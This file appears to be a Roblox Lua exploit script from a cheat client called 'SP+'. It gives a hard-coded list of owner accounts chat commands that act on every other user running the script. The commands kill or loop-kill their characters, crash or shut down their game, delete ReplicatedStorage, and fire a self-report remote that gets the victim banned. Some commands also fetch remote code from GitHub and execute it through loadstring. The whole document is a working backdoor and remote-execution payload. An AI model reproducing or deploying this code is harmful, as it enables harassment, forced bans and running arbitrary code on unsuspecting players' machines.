		local textChatService = game:GetService("TextChatService") 
		local allowedplayers = {
			{name = "ggSnoopyConfigs", tag = 1 },
			{name = "iFoundMomsNonKidToys", tag = 5 },
			{name = "haterbot", tag = 5 };
		}
		
		local chatTags = {
			[1] = {name = "SP+ OWNERðŸ’œ", color = Color3.fromRGB(137, 207, 240)},
			[2] = {name = "SP+ PRIVATE", color = Color3.fromRGB(137, 207, 240)},
			[3] = {name = "SP+ DEV", color = Color3.fromRGB(137, 207, 240)},
			[4] = {name = "SP+ ADMIN", color = Color3.fromRGB(137, 207, 240)},
		}
		 
		local playersService = game:GetService("Players")
		
		local function getPlayerTag(playerName)
			for _, player in ipairs(allowedplayers) do
				if player.name == playerName then
					return player.tag
				end
			end
			return nil
		end
		
		local function isPlayerAllowed(playerName)
			return getPlayerTag(playerName) ~= nil
		end
		
		local commands = {
		
			[";kill default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				end
			end,
			[";funnyvideo default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local filename = "bruh"
					local ScreenGui = Instance.new("ScreenGui")
					ScreenGui.IgnoreGuiInset = true
					ScreenGui.Parent = game:GetService("CoreGui")
					
					local video = Instance.new("VideoFrame")
					video.Size = UDim2.new(1, 0, 1, 0)
					video.Parent = ScreenGui
					
					local Name = filename .. ".mp4"
					if not isfile(Name) then
						writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
					end
					
					video.Video = syn and getsynasset(Name) or getcustomasset(Name)
					
					repeat
						task.wait()
						print("Retrying...")
					until video.Loaded
					
					video:Play()
				end
			end,
			[";reveal default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local textChatService = game:GetService("TextChatService")
					wait(0.0001)
					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using SP+ Config Made By Snoopy")
				end
			end,
			[";void default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local character = game.Players.LocalPlayer.Character
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local newPosition = humanoidRootPart.CFrame
					for i = 1, 3 do
						newPosition = newPosition + Vector3.new(0, -40, 0)
						humanoidRootPart.CFrame = newPosition
						wait(0.01)
					end
				end
			end,
			[";blind default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local blur = Instance.new("BlurEffect")
					blur.Size = 10000000000000
					blur.Parent = game.Lighting
				end
			end,
			[";unblind default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
					if blur then
						blur:Destroy()
					end
				end
			end,
			[";troll default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
				end
			end,
			[";kick default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					wait(1)
					for index, player in pairs(game.Players:GetPlayers()) do
						player:Kick("Snoopy Owns You")
					end
				end
			end,
			[";ban default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local rs = game:GetService("ReplicatedStorage")
					local remote = rs:FindFirstChild("SelfReport", true)
					remote:FireServer("injection_detected")
				end
			end,
			[";rickroll default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
				end
			end,
			[";freeze default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
				end
			end,
			[";thaw default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
				end
			end,
			[";lobby default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
				end
			end,
			[";quitgame default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					game:Shutdown()
				end
			end,
			[";lagback default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					for i = 1, 10 do
						wait()
						local player = game.Players.LocalPlayer
						local character = player.Character or player.CharacterAdded:Wait()
						local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
						local forwardVector = humanoidRootPart.CFrame.LookVector
						local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
						humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
					end
				end
			end,
			[";breakgame default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					pcall(function()
						local replicatedStorage = game:GetService("ReplicatedStorage")
						for _, child in ipairs(replicatedStorage:GetDescendants()) do
							child:Destroy()
						end
					end)
				end
			end,
			[";breakmap default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local function unanchorParts(object)
						if object:IsA("BasePart") then
							object.Anchored = false
						end
						for _, child in ipairs(object:GetChildren()) do
							unanchorParts(child)
						end
					end
					unanchorParts(workspace)
				end
			end,
			[";crash default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					while true do end
				end
			end,
			[";infping default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					local thingy = settings().Network
					thingy.IncomingReplicationLag = math.huge
				end
			end,
			[";lag default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
					local RunService = game:GetService("RunService")
					local player = game.Players.LocalPlayer
					local character = player.Character or player.CharacterAdded:Wait()
					local rootPart = character:WaitForChild("HumanoidRootPart")
					RunService.Heartbeat:Connect(function()
						for i = 1, 100 do
							local part = Instance.new("Part")
							part.Anchored = false
							part.CanCollide = true
							part.Transparency = 1
							part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
							part.Parent = workspace
						end
					end)
				end
			end,
			[";loopkill default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					_G.loopkill = true;
					while _G.loopkill == true do
						game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
						wait(2)
					end
				end
			end,
			[";unloopkill default"] = function()
				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
					_G.loopkill = false;
					while _G.loopkill == true do
						game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
						wait(2)
					end
				end
			end
		}
